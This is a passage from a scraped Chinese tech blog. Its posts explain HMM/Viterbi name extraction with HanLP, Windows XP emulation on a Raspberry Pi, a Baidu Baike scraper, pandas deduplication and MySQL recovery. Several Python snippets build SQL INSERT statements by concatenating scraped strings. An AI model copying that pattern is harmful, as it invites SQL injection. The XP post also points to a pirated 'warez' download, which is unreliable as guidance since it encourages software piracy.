probability）。就我们的例子来说，六面骰（D6）产生1的输出概率是1/6。产生2，3，4，5，6的概率也都是1/6。我们同样可以对输出概率进行其他定义。比如，我有一个被赌场动过手脚的六面骰子，掷出来是1的概率更大，是1/2，掷出来是2，3，4，5，6的概率是1/10。\n\n\n其实对于HMM来说，如果提前知道所有隐含状态之间的转换概率和所有隐含状态到所有可见状态之间的输出概率，做模拟是相当容易的。但是应用HMM模型时候呢，往往是缺失了一部分信息的，有时候你知道骰子有几种，每种骰子是什么，但是不知道掷出来的骰子序列；有时候你只是看到了很多次掷骰子的结果，剩下的什么都不知道。如果应用算法去估计这些缺失的信息，就成了一个很重要的问题。这些算法我会在下面详细讲。\n××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××​      如果你只想看一个简单易懂的例子，就不需要往下看了。​ ××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××​    说两句废话，答主认为呢，要了解一个算法，要做到以下两点：会其意，知其形。答主回答的，其实主要是第一点。但是这一点呢，恰恰是最重要，而且很多书上不会讲的。正如你在追一个姑娘，姑娘对你说“你什么都没做错！”你要是只看姑娘的表达形式呢，认为自己什么都没做错，显然就理解错了。你要理会姑娘的意思，“你赶紧给我道歉！”这样当你看到对应的表达形式呢，赶紧认错，跪地求饶就对了。数学也是一样，你要是不理解意思，光看公式，往往一头雾水。不过呢，数学的表达顶多也就是晦涩了点，姑娘的表达呢，有的时候就完全和本意相反。所以答主一直认为理解姑娘比理解数学难多了。\n回到正题，和HMM模型相关的算法主要分为三类，分别解决三种问题：**      1）知道骰子有几种（隐含状态数量），每种骰子是什么（转换概率），根据掷骰子掷出的结果（可见状态链），我想知道每次掷出来的都是哪种骰子（隐含状态链）。**​      这个问题呢，在语音识别领域呢，叫做解码问题。这个问题其实有两种解法，会给出两个不同的答案。每个答案都对，只不过这些答案的意义不一样。第一种解法求最大似然状态路径，说通俗点呢，就是我求一串骰子序列，这串骰子序列产生观测结果的概率最大。第二种解法呢，就不是求一组骰子序列了，而是求每次掷出的骰子分别是某种骰子的概率。比如说我看到结果后，我可以求得第一次掷骰子是D4的概率是0.5，D6的概率是0.3，D8的概率是0.2.第一种解法我会在下面说到，但是第二种解法我就不写在这里了，如果大家有兴趣，我们另开一个问题继续写吧。\n2）还是知道骰子有几种**（隐含状态数量）**，每种骰子是什么**（转换概率）**，根据掷骰子掷出的结果**（可见状态链）**，我想知道掷出这个结果的概率。​      看似这个问题意义不大，因为你掷出来的结果很多时候都对应了一个比较大的概率。问这个问题的目的呢，其实是检测观察到的结果和已知的模型是否吻合。如果很多次结果都对应了比较小的概率，那么就说明我们已知的模型很有可能是错的，有人偷偷把我们的骰子給换了。\n3）知道骰子有几种**（隐含状态数量）**，不知道每种骰子是什么**（转换概率）**，观测到很多次掷骰子的结果**（可见状态链）**，我想反推出每种骰子是什么**（转换概率）**。​      这个问题很重要，因为这是最常见的情况。很多时候我们只有可见结果，不知道HMM模型里的参数，我们需要从可见结果估计出这些参数，这是建模的一个必要步骤。\n问题阐述完了，下面就开始说解法。（0号问题在上面没有提，只是作为解决上述问题的一个辅助）​      0.一个简单问题其实这个问题实用价值不高。由于对下面较难的问题有帮助，所以先在这里提一下。知道骰子有几种，每种骰子是什么，每次掷的都是什么骰子，根据掷骰子掷出的结果，求产生这个结果的概率。\n\n解法无非就是概率相乘：1.看见不可见的，破解骰子序列​      这里我说的是第一种解法，解最大似然路径问题。​      举例来说，我知道我有三个骰子，六面骰，四面骰，八面骰。我也知道我掷了十次的结果（1 6 3 5 2 7 3 5 2 4），我不知道每次用了那种骰子，我想知道最有可能的骰子序列。\n其实最简单而暴力的方法就是穷举所有可能的骰子序列，然后依照第零个问题的解法把每个序列对应的概率算出来。然后我们从里面把对应最大概率的序列挑出来就行了。如果马尔可夫链不长，当然可行。如果长的话，穷举的数量太大，就很难完成了。​      另外一种很有名的算法叫做Viterbi algorithm. 要理解这个算法，我们先看几个简单的列子。​      首先，如果我们只掷一次骰子：\n\n看到结果为1.对应的最大概率骰子序列就是D4，因为D4产生1的概率是1/4，高于1/6和1/8.​      把这个情况拓展，我们掷两次骰子：\n\n结果为1，6.这时问题变得复杂起来，我们要计算三个值，分别是第二个骰子是D6，D4，D8的最大概率。显然，要取到最大概率，第一个骰子必须为D4。这时，第二个骰子取到D6的最大概率是​      同样的，我们可以计算第二个骰子是D4或D8时的最大概率。我们发现，第二个骰子取到D6的概率最大。而使这个概率最大时，第一个骰子为D4。所以最大概率骰子序列就是D4 D6。继续拓展，我们掷三次骰子：\n\n同样，我们计算第三个骰子分别是D6，D4，D8的最大概率。我们再次发现，要取到最大概率，第二个骰子必须为D6。这时，第三个骰子取到D4的最大概率是​      同上，我们可以计算第三个骰子是D6或D8时的最大概率。我们发现，第三个骰子取到D4的概率最大。而使这个概率最大时，第二个骰子为D6，第一个骰子为D4。所以最大概率骰子序列就是D4 D6 D4。\n写到这里，大家应该看出点规律了。既然掷骰子一二三次可以算，掷多少次都可以以此类推。我们发现，我们要求最大概率骰子序列时要做这么几件事情。首先，不管序列多长，要从序列长度为1算起，算序列长度为1时取到每个骰子的最大概率。然后，逐渐增加长度，每增加一次长度，重新算一遍在这个长度下最后一个位置取到每个骰子的最大概率。因为上一个长度下的取到每个骰子的最大概率都算过了，重新计算的话其实不难。当我们算到最后一位时，就知道最后一位是哪个骰子的概率最大了。然后，我们要把对应这个最大概率的序列从后往前推出来。2.谁动了我的骰子？​      比如说你怀疑自己的六面骰被赌场动过手脚了，有可能被换成另一种六面骰，这种六面骰掷出来是1的概率更大，是1/2，掷出来是2，3，4，5，6的概率是1/10。你怎么办么？答案很简单，算一算正常的三个骰子掷出一段序列的概率，再算一算不正常的六面骰和另外两个正常骰子掷出这段序列的概率。如果前者比后者小，你就要小心了。​      比如说掷骰子的结果是： \n\n要算用正常的三个骰子掷出这个结果的概率，其实就是将所有可能情况的概率进行加和计算。同样，简单而暴力的方法就是把穷举所有的骰子序列，还是计算每个骰子序列对应的概率，但是这回，我们不挑最大值了，而是把所有算出来的概率相加，得到的总概率就是我们要求的结果。这个方法依然不能应用于太长的骰子序列（马尔可夫链）。​      我们会应用一个和前一个问题类似的解法，只不过前一个问题关心的是概率最大值，这个问题关心的是概率之和。解决这个问题的算法叫做前向算法（forward algorithm）。首先，如果我们只掷一次骰子：\n\n看到结果为1.产生这个结果的总概率可以按照如下计算，总概率为0.18：\n\n把这个情况拓展，我们掷两次骰子：\n\n看到结果为1，6.产生这个结果的总概率可以按照如下计算，总概率为0.05：\n\n继续拓展，我们掷三次骰子：\n\n看到结果为1，6，3.产生这个结果的总概率可以按照如下计算，总概率为0.03：\n\n同样的，我们一步一步的算，有多长算多长，再长的马尔可夫链总能算出来的。用同样的方法，也可以算出不正常的六面骰和另外两个正常骰子掷出这段序列的概率，然后我们比较一下这两个概率大小，就能知道你的骰子是不是被人换了。\nViterbi algorithmHMM（隐马尔可夫模型）是用来描述隐含未知参数的统计模型，举一个经典的例子：一个东京的朋友每天根据天气{下雨，天晴}决定当天的活动{公园散步,购物,清理房间}中的一种，我每天只能在twitter上看到她发的推“啊，我前天公园散步、昨天购物、今天清理房间了！”，那么我可以根据她发的推特推断东京这三天的天气。在这个例子里，显状态是活动，隐状态是天气。\n任何一个HMM都可以通过下列五元组来描述：\n:param obs:观测序列:param states:隐状态:param start_p:初始概率（隐状态）:param trans_p:转移概率（隐状态）:param emit_p: 发射概率 （隐状态表现为显状态的概率）\n\n[\n伪码如下：\nstates = (&#x27;Rainy&#x27;, &#x27;Sunny&#x27;) observations = (&#x27;walk&#x27;, &#x27;shop&#x27;, &#x27;clean&#x27;) start_probability = &#123;&#x27;Rainy&#x27;: 0.6, &#x27;Sunny&#x27;: 0.4&#125; transition_probability = &#123;    &#x27;Rainy&#x27; : &#123;&#x27;Rainy&#x27;: 0.7, &#x27;Sunny&#x27;: 0.3&#125;,    &#x27;Sunny&#x27; : &#123;&#x27;Rainy&#x27;: 0.4, &#x27;Sunny&#x27;: 0.6&#125;,    &#125; emission_probability = &#123;    &#x27;Rainy&#x27; : &#123;&#x27;walk&#x27;: 0.1, &#x27;shop&#x27;: 0.4, &#x27;clean&#x27;: 0.5&#125;,    &#x27;Sunny&#x27; : &#123;&#x27;walk&#x27;: 0.6, &#x27;shop&#x27;: 0.3, &#x27;clean&#x27;: 0.1&#125;,&#125;\n\n求解最可能的天气求解最可能的隐状态序列是HMM的三个典型问题之一，通常用维特比算法解决。维特比算法就是求解HMM上的最短路径（-log(prob)，也即是最大概率）的算法。\n稍微用中文讲讲思路，很明显，第一天天晴还是下雨可以算出来：\n\n定义V[时间][今天天气] = 概率，注意今天天气指的是，前几天的天气都确定下来了（概率最大）今天天气是X的概率，这里的概率就是一个累乘的概率了。\n​    因为第一天我的朋友去散步了，所以第一天下雨的概率V[第一天][下雨] = 初始概率[下雨] * 发射概率[下雨][散步] = 0.6 * 0.1 = 0.06，同理可得V[第一天][天晴] = 0.24 。从直觉上来看，因为第一天朋友出门了，她一般喜欢在天晴的时候散步，所以第一天天晴的概率比较大，数字与直觉统一了。\n从第二天开始，对于每种天气Y，都有前一天天气是X的概率 * X转移到Y的概率 * Y天气下朋友进行这天这种活动的概率。因为前一天天气X有两种可能，所以Y的概率有两个，选取其中较大一个作为V[第二天][天气Y]的概率，同时将今天的天气加入到结果序列中\n比较V[最后一天][下雨]和[最后一天][天晴]的概率，找出较大的哪一个对应的序列，就是最终结果。\n\n算法的代码可以在github上看到，地址为：\nhttps://github.com/hankcs/Viterbi\n运行完成后根据Viterbi得到结果：\nSunny Rainy Rainy\n\nViterbi被广泛应用到分词，词性标注等应用场景。\n以上内容均为引用。\nHanLP 原理上面引用铺垫了那么多，为了解释清楚HanLP是用什么算法对中国名字进行分词的。具体的，HanLP实现了论文《基于角色标注的中国人名自动识别研究》。\n如果有兴趣，可以快速理解此文，看这些段落：\n\n如果你掌握贝叶斯公式，并且看了上述文章，了解马尔科夫假设并不难理解。\nHanLP应用HanLP是一个优秀的NLP库，可是是用Java写的，这里我们需要用jpype包帮助pyhton调用Jar包。\n神奇吧？Python还能调用Jar包\nPython调用Jar包第一步 下载HanLP\n去官方指定网址的release中下载jar包和相应的data.zip\n解压zip，放置于python的根目录\nhttps://github.com/hankcs/HanLP\n第二步 在启动的时候启动Java虚拟机\nstartJVM(getDefaultJVMPath(),                 &quot;-Djava.class.path=/Users/ivan/d/uobspider/hanlp-1.3.5.jar:/Users/ivan/d/uobspider/&quot;,                 &quot;-Xms1g&quot;, &quot;-Xmx1g&quot;)  # 启动JVM，Linux需替换分号;为冒号:\n\n第三步 创建Jar包对象\nJDClass = JClass(&quot;com.hankcs.hanlp.seg.CRF.CRFSegment&quot;)\n\n第四步 创建分词对象\njd = JDClass().enableNameRecognize(True)\n\n第四步 提取相关词性部分\n根据HanLP的官方给出的词性标注，可以断定 /nr 为人名标准，我们只需要在python代码中国呢判断是否包含 /nr 属性\nif &quot;nr&quot; in str(i.nature):\n\n这就是所谓的抛砖引玉\n具体代码具体代码仍然写在了filter代码中，会创建一个新表filter_second，并将过滤后的数据复制存于此中。\n# coding=utf-8# python version：2.7from sqlalchemy import create_enginefrom jpype import *import pandas as pdreload(sys)sys.setdefaultencoding(&#x27;utf-8&#x27;)import pymysqlfrom pybloomfilter import BloomFilterclass Filter(object):    def __init__(self):        self.db = pymysql.connect(&quot;localhost&quot;, &quot;root&quot;, &quot;&quot;, &quot;uob&quot;, use_unicode=True, charset=&quot;utf8&quot;)        self.engine = create_engine(&#x27;mysql+pymysql://root:@localhost:3306/uob?charset=utf8&#x27;)        self.cursor = self.db.cursor()        self.bfilter = BloomFilter(1000, 0.001, &#x27;uob.bloom&#x27;)        startJVM(getDefaultJVMPath(),                 &quot;-Djava.class.path=/Users/ivan/d/uobspider/hanlp-1.3.5.jar:/Users/ivan/d/uobspider/&quot;,                 &quot;-Xms1g&quot;, &quot;-Xmx1g&quot;)  # 启动JVM，Linux需替换分号;为冒号:    def distinct(self):        sql = &quot;SELECT * FROM list;&quot;        allData = pd.read_sql(sql, con=self.engine)  # 从抓取过来的数据库读入        allData.drop_duplicates(&#x27;name&#x27;, &#x27;first&#x27;, inplace=True)  # 去除重复name        allData.drop_duplicates(&#x27;url&#x27;, &#x27;first&#x27;, inplace=True)  # 去除重复url        allData.reset_index(drop=True, inplace=True)  # index重新计数        print allData.detail()        allData.to_sql(&#x27;first_filter&#x27;, self.engine, if_exists=&#x27;replace&#x27;, index=True, index_label=&#x27;fid&#x27;)  # 输出到新的数据库表        return allData    def insertData(self, id, name, url):        insertsql = &quot;INSERT INTO filter_second (list_id,name,url) VALUES(&quot; + str(id) + &quot;,\\&quot;&quot; + str(            name) + &quot;\\&quot;,\\&quot;&quot; + str(url) + &quot;\\&quot;);&quot;        print insertsql        try:            self.cursor.execute(insertsql)            self.db.commit()        except:            self.db.rollback()            print &quot;error&quot;    def filterHMM(self):        sql = &quot;SELECT id,name,url FROM list;&quot;        self.cursor.execute(sql)        allData = self.cursor.fetchall()        JDClass = JClass(&quot;com.hankcs.hanlp.seg.CRF.CRFSegment&quot;)        jd = JDClass().enableNameRecognize(True)        names = []        for data in allData:            s = data[1]            words = jd.seg(jpype.JString(s))            for i in words:                if &quot;nr&quot; in str(i.nature):                    tmp = str(i.word)                    if len(tmp) &gt; 1:                        self.insertData(data[0], data[1], data[2])                        breakif __name__ == &quot;__main__&quot;:    obj_filter = Filter()    obj_filter.distinct()    obj_filter.filterHMM()\n\n\n\n效果其实效果并非非常理想，还是有很多无用信息和漏下来的信息，但是总体上还是不错的。\n\n下章预告：“我是如何收集校友的”之百度百科批量下载器\n","categories":["Python"],"tags":["数据"]},{"title":"实战树莓派安装Windows XP","url":"http://www.yfgeek.com/2017/10/29/实战树莓派安装Windows-xp/","content":"序记得小时候，家里的电脑一直安装着Windows 98，天天骂windows难用，虽然没有别的最新的操作系统可以用，也看不出来Windows 98的设计风格有多么古朴，只是bug奇多，动不动就崩溃，系统级别的崩溃，蓝屏，甚至直接坏掉再也无法开机。\n直到有一天，偶然的机会，姐姐家里新买来的电脑，过去一看，大不一样，蓝色的界面，巨好看的任务栏、窗体样式，却不知道什么系统，感觉像是windows 却觉得清晰稳定了许多。\n后来，我逐渐的了解到，这个系统的名字叫Windows XP，那是2002年，漂亮的界面，清脆优雅的提示音，可爱的图标，让我永远无法忘怀。\n回家后，求人把家里的电脑装成Windows XP，却被告知电脑内存只有256MB，硬盘只有30GB，cpu只有800MHZ的配置装的话可能会很卡。无奈之下，我也只好选择接受现实。\n有时候，人越没有却得不到的东西，往往是美好的。一见钟情的Windows XP甚至到做梦都会梦到，能梦到Windows meida player、Windows XP之类的把玩，虽然梦里的情节似乎有些不对，但是那种兴奋的感觉，至今无法忘怀。\n朝思暮想，什么时候能够玩一玩这个系统，那个时候互联网并不发达，并非是没有网络，只是网络搜不到你想搜的东西，也不是任何一个东西都能在网络上下载到，你说：用迅雷呗？不不不，那个时候没有迅雷，只有——网络蚂蚁。\n用Windows 98是痛苦的，经常崩溃甚至需要重新安装系统，我有没有想过过渡产品，比如Windows 2000，对的，有的，其中的过程中我装过几次，但是Windows 2000给我的感觉不是很理想。\n2003年，直到有一天，忍无可忍的我，去盗版盘零售店，花了10块钱买了一张Windows XP SP2的安装光盘，我的幸福人生从此开始——\n时至今日，我仍然十分喜欢Windows XP，尽管已经过去14年之久，人很难忘记短暂的美好的东西。\n安装下面回归正文，本文写写如何用树莓派 3（Raspberry Pi 3）安装Windows XP。\n其实这是一个伪命题，arm架构怎么能够安装Windows XP呢？充其量应该算是模拟，没错，答题思路就是在系统上安装虚拟机，用arm虚拟机模拟x86架构安装Windows XP。\n其实方法很简单，进入终端，首先：\nsudo apt-get update\n\n确认无误后，我们开始安装qemu和kvm：\nsudo apt-get install qemu-kvm qemu virt-manager virt-viewer libvirt-bin\n\n网速快的话，应该很快就装完了，这时候一定要重启电脑，否则会提示 libvirt未启动：\n\n重启后，下载精简版XP MicroXP 密码：warez-bb，当然你愿意安装完整版，也不是不可以。只要下载好并且把iso文件复制到系统里即可。\n接下来的事情很简单，创建虚拟机：\n应用程序-系统工具-虚拟系统管理器\n随后：文件-新建虚拟机\n弹出来的对话框里，配置系统架构为x86_64，内存为256mb，所占空间按照自己比例分配，建议1.5GB-2GB。\n然后开始启动就可以安装了，安装过程大概需要3-4个小时。\n图鉴以下是一些图鉴，敬请欣赏。\n\n\n\n\n\n\n\n\n\n\n本文谨纪念美好的童年时代。\n","categories":["Raspberry"],"tags":["Raspberry"]},{"title":"“我是如何收集校友的”之数据去重","url":"http://www.yfgeek.com/2017/10/27/“我是如何收集校友的”之数据去重/","content":"按照上文讲到，我们已经抓取到了所有与“伯明翰大学”相关的数据，我们接下来要做的就是做数据清洗工作。\n\n我们当前进度：2\n\n爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据\n数据去重——用pandas去掉抓取相同的URL或相同的名称\n提取人名——利用HMM-Viterbi进行人名筛选与提取\n下载器——下载所有数据库中数据清洗过的URL，并存入数据库\n人物Ranking——按照一定的排名方式，对人物进行知名度排名\n人物梗概——利用NLP相关库，对提取的人物进行自动化梗概\n\n为什么要进行去重？还不是因为爬虫爬下来的结果有大量的重复的信息，在后期的人名筛选甚至下载来说，我们提前先搞定这个重复的问题，节省工作量。有人提出可以在人名过滤后再去重，我想未尝不是一个好点子，但是HMM-Viterbi算法的复杂度高，这样可能降低后期的效率，提前去重未尝不可。\n如图下所示，有很多重复切无用的信息。\n\n关于去重，很多人第一时间想到了布隆过滤器，但是试问，在仅有不到1000的数据量的数据需要用到吗？本文用pandas自带的去重函数drop_duplictad()去重。如果想了解布隆过滤器，我自己也练手写了一个简单的范例。\n首先，将SQL数据库中所有数据作为DataFrame输入到pandas，\n然后，对相同名字的内容进行去重，\n然后，对相同URL的内容进行去重，\n随后，重新建立索引，\n最后，将内容输出到新的数据表first_filter上，完成今天的工作。\n# coding=utf-8# python version：2.7from jpype import *import pandas as pdfrom sqlalchemy import create_engineimport pymysqlreload(sys)sys.setdefaultencoding(&#x27;utf-8&#x27;)class Filter(object):    def __init__(self):        self.engine = create_engine(&#x27;mysql+pymysql://root:@localhost:3306/uob?charset=utf8&#x27;)            def distinct(self):        sql = &quot;SELECT * FROM list;&quot;        allData = pd.read_sql(sql, con=self.engine)  # 从抓取过来的数据库读入        allData.drop_duplicates(&#x27;name&#x27;, &#x27;first&#x27;, inplace=True)  # 去除重复name        allData.drop_duplicates(&#x27;url&#x27;, &#x27;first&#x27;, inplace=True) # 去除重复url        allData.reset_index(drop=True, inplace=True) # index重新计数        print allData.tail()        allData.to_sql(&#x27;first_filter&#x27;, self.engine, if_exists=&#x27;replace&#x27;, index=True, index_label=&#x27;fid&#x27;)  # 输出到新的数据库表first_filter        return allDataif __name__ == &quot;__main__&quot;:    obj_filter = Filter()    obj_filter.distinct()\n\n跑完后我们到数据库中看看\n\n不错，数据量已经下降到了708个，去重工作完成，其实在这期间遇到了很多坑，很多问题，不一一阐述，均为python环境问题。\n下集预告：“我是如何收集校友的”之利用基于HMM-Viterbi的HanLP进行人名提取\n","categories":["Python"],"tags":["数据"]},{"title":"“我是如何收集校友的”之爬虫模块","url":"http://www.yfgeek.com/2017/10/26/我是如何收集校友的之爬虫/","content":"打开伯明翰大学的百科，发现与某相邻学校相比，中国校友实在太少，可能是校友过于低调。于是萌生一个想法，写一个爬虫找出百度百科里所有与“伯明翰”大学有关的校友，然后自动汇总，生成人物梗概，按照知名度排序。\n需求大概就是这样，也就是说，我们需要以下几个模块：\n\n爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据\n数据去重——用pandas去掉抓取相同的URL或相同的名称\n提取人名——利用HMM-Viterbi进行人名筛选与提取\n下载器——下载所有数据库中数据清洗过的URL，并存入数据库\n人物Ranking——按照一定的排名方式，对人物进行知名度排名\n人物梗概——利用NLP相关库，对提取的人物进行自动化梗概\n\n话不多说，现在开始进行爬虫部分。\n爬虫部分分为两类：信息获取器、URL管理器\n信息获取器自动抓取百度搜索结果内容，并将其存入URL管理器\n首先建立数据库uob，并且建立一个表明为list的表用于存储百度百科基础数据\nSET NAMES utf8;CREATE TABLE `list` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(255) DEFAULT NULL,  `url` varchar(255) DEFAULT NULL,  `description` varchar(255) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;\n\nspider.py\n#coding=utf-8#python version：2.7import urllibimport urllib2import timefrom bs4 import BeautifulSoup as BSfrom urlmanager import UrlManagerclass Spider(object):    def __init__(self):        self.urls = UrlManager()    #url管理器    def baidusearch(self,word,page):        baseUrl = &#x27;http://www.baidu.com/s&#x27;        data = &#123;&#x27;wd&#x27;: word, &#x27;pn&#x27;: str(page - 1) + &#x27;0&#x27;, &#x27;tn&#x27;: &#x27;baidurt&#x27;, &#x27;ie&#x27;: &#x27;utf-8&#x27;, &#x27;bsst&#x27;: &#x27;1&#x27;&#125;        data = urllib.urlencode(data)        url = baseUrl + &#x27;?&#x27; + data        try:            request = urllib2.Request(url)            response = urllib2.urlopen(request)        except urllib2.HttpError, e:            print e.code            exit(0)        except urllib2.URLError, e:            print e.reason            exit(0)        html = response.read()        soup = BS(html, &quot;lxml&quot;)        td = soup.find_all(class_=&#x27;f&#x27;)        for t in td:            name = t.h3.a.get_text().replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\t&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;).replace(u&#x27;_百度百科&#x27;,&#x27;&#x27;)            # print name            url = t.h3.a[&#x27;href&#x27;].replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)            # print url            font_str = t.find_all(&#x27;font&#x27;, attrs=&#123;&#x27;size&#x27;: &#x27;-1&#x27;&#125;)[0].get_text()            start = 0  # 起始            realtime = t.find_all(&#x27;div&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;realtime&#x27;&#125;)            if realtime:                realtime_str = realtime[0].get_text()                start = len(realtime_str)                # print realtime_str            end = font_str.find(&#x27;...&#x27;)            # print font_str[start:end+3],&#x27;\\n&#x27;            self.urls.add_new_url(name, url, font_str[start:end+3].replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\t&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;))if __name__==&quot;__main__&quot;:    obj_spider = Spider()    for x in range(1,200):        obj_spider.baidusearch(&#x27;伯明翰大学 site:baike.baidu.com&#x27;, x)        time.sleep(3)\n\nurlmanager.py\n#coding=utf-8#python version：2.7import pymysqlclass UrlManager(object):    def __init__(self):        self.new_urls = dict()  # 待爬取url        self.old_urls = dict()  # 已爬取url        self.db = pymysql.connect(&quot;localhost&quot;, &quot;root&quot;, &quot;&quot;, &quot;uob&quot; ,use_unicode=True, charset=&quot;utf8&quot;)        self.cursor = self.db.cursor()    def add_new_url(self, name, url, description):  # 向管理器中添加一个新的url        if url is None:            return        if url not in self.new_urls and url not in self.old_urls:            self.new_urls[name] = url            sql = u&quot;INSERT INTO list (name,  url, description) VALUES (\\&quot;&quot; + name  +  u&quot;\\&quot;, \\&quot;&quot; + url + u&quot;\\&quot;, \\&quot;&quot; + description + u&quot;\\&quot;);&quot;            print sql            try:                # 执行sql语句                self.cursor.execute(sql)                # 提交到数据库执行                self.db.commit()                # print &quot;success&quot;            except:                # Rollback in case there is any error                self.db.rollback()                print &quot;error&quot;\n\n将数据存入数据库，最后获取信息如下：\n\n\n明日更新：“我是如何收集校友的”之数据去重\n","categories":["Python"],"tags":["数据"]},{"title":"记一次MySQL无法启动及修复经历","url":"http://www.yfgeek.com/2017/08/18/记一次Mysql无法启动及修复经历/","content":"记得有次本地的MySQL无法启动，网上说，去删掉InnoDB日志就行，我就傻乎乎的去删掉了InnoDB相关的文件，果然，没有任何问题，正常启动了。\n可是谁曾想，过了几天，故障复现了，我就按部就班的又去删除，结果，又解决了。\n可是，现在棘手的问题又出现了，数据库，彻底的挂掉了。\n[ERROR] InnoDB: Attempted to open a previously opened tablespace2017-08-18 20:07:04 140736493900736 [ERROR] InnoDB: Attempted to open a previously opened tablespace. Previous tablespace blockvotes/vote uses space ID: 7 at filepath: ./blockvotes/vote.ibd. Cannot open tablespace phpmyadmin/pma__pdf_pages which uses space ID: 7 at filepath: ./phpmyadmin/pma__pdf_pages.ibd2017-08-18 20:07:04 7fffc4b9d3c0  InnoDB: Operating system error number 2 in a file operation.InnoDB: The error means the system cannot find the path specified.InnoDB: If you are installing InnoDB, remember that you must createInnoDB: directories yourself, InnoDB does not create them.InnoDB: Error: could not open single-table tablespace file ./phpmyadmin/pma__pdf_pages.ibd\n\n按照网上的说法，没救了，因为第一次删除了InnoDB的ibdata1文件，这个文件是共享表空间，是不可以随便乱删的。\n可是想着我的数据库里还存着很多东西，不能就这样放弃。\n终于，找到了强力解决方法！\n修复方法，打开my.cnf文件，把开启mysql的innodb强制修复属性\n[mysqld]innodb_force_recovery = 1\n\n启动服务后，瞬间好了，数据完好无损，没有丢失。\n","categories":["Web"],"tags":["Web"]},{"title":"BlockVotes 一个基于区块链的环签名投票系统","url":"http://www.yfgeek.com/2017/08/10/BlockVotes-一个基于区块链的环签名投票系统/","content":"好久好久没有写Blog了，最近在忙我的论文，题目是一个基于区块链的环签名投票系统。\n听着名字挺绕的，实际上也是挺绕的，我做这个题目实际上是将三个学术领域的东西放在了一起：\n\n电子投票 (e-voting) 属于密码学\n区块链(blockchain) 属于密码学的应用\n环签名(ring-signature) 属于密码学\n\n如果对以上三个概念无任何了解，基本上就告别理解我做的东西了。这个项目目前处于私有项目状态之中，由于存在毕业设计可能会代码查重的问题，在九月初，将会对本项目彻底开源。\n理念\n\n电子投票？实际上，这个学术命题属于电子投票方向的，在电子投票学术方向上属于创新型，在区块链上属于应用型，在谈及这些问题之前，得先说说学术上的电子投票的一些概念：\n\n隐私性:\n\n选票保密性 (BP): 任何攻击者都无法把用户所投的票和投票者的身份联系起来。\n无收据性 (RF): 投票者在投票后不能证明他是怎么投票的。系统不允许投票者在投票后证明这些。\n不可强制性 (CR): 任何攻击者都无法强制用户生成自己不想投的票据。 攻击者不会强迫选民得到相应的收据以供强迫者检查。\n\n可验证性:\n\n个体可验证性：每个投票者可以验证自己的投票是不是倍正确计入所有投票。\n全局验证性：任何投票者都可以验证其他投票者所投票的合法性。\n\n不可重投性:\n不可重投性指的是，任何投票者无法对相同的消息进行两次投票。\n公平性:\n公平性指的是，任何人都无法提前知道选票的结果，以及无法影响选票的结果。\n其实还有很多很多概念，具体可以参考引用中的第一个论文。\n实际上，隐私性和可验证性在一定程度上是互相矛盾的，保障可验证性的情况下就可能无法保证隐私，我们在电子投票的方面的目标是尽可能的保障以上的目标。\n所以，设计一个系统是从隐私性和可验证性的角度上出发的，这也就解释了，为什么用区块链，为什么用环签名。\n为什么用区块链区块链是什么？区块链可以理解为“分布式公共账本”，按照计算机的角度上，如果你对区块链一窍不通，你可以理解为一个可 增加、查找 却不能修改、删除的 分布式实时数据库。而比特币中的交易信息就是存在这个数据库之中的。\n如果你还是不理解，请千万不要到互联网上搜索什么是比特币、比特币挖矿原理、什么是区块链，只会让你更加疑惑，他们试图把区块链描述的非常高大上，迷惑你，并且告诉外人，这是很高大上的东西，其实不是，如果你真正研究过区块链的协议，你会觉得其实不是那么回事。在此，对于那些故作玄虚的文章，我想引用《LaTeX新人教程，30分钟从完全陌生到基本入门》文章所说的一句话表达我的心情：\n\n我要严厉警告和强烈声讨那些自以为是advanced LaTeX user的人。请你们不要为了自己那一点可怜可悲的虚荣心，去刻意渲染LaTeX有多么高端多么不容易学习，这和孔乙己炫耀茴香豆的茴字有四种写法有什么区别么？混账！LaTeX到底有多“难”你们自己清楚好么？\n\n所以，我附了一篇论文[3]，不过是英文版的，但是都是纯白话口语讲述到底什么是区块链，比特币的挖矿原理，实际上是非常浅显易懂的。如果有时间，恰当的时候，我也可以翻译成中文。\n\n世界上第一个区块链是比特币创造的，比特币需要区块链才能够叫做区块链，为什么？\n因为作为“货币“，最根本的存在的意义是什么？\n证明资产？自己是富二代？不不不，不是的。\n根本意义实际上是交易，人类社会，有了交易，才有了货币，货币是一般等价物，这个我们在中学都学过。\n那么作为一种货币，货币是要流通的，如果顾客买了商家的东西，是不是要顾客给商家付款呀？天经地义的。\n这个过程就是交易，那么，如何证明顾客已经把钱付给了商家？\n在现实生活中，太简单了，根本不用证明，顾客直接把钱给商家就行了。\n但是，如果顾客用银行卡或者支付宝呢？\n好！我们的概念来了，这个概念叫 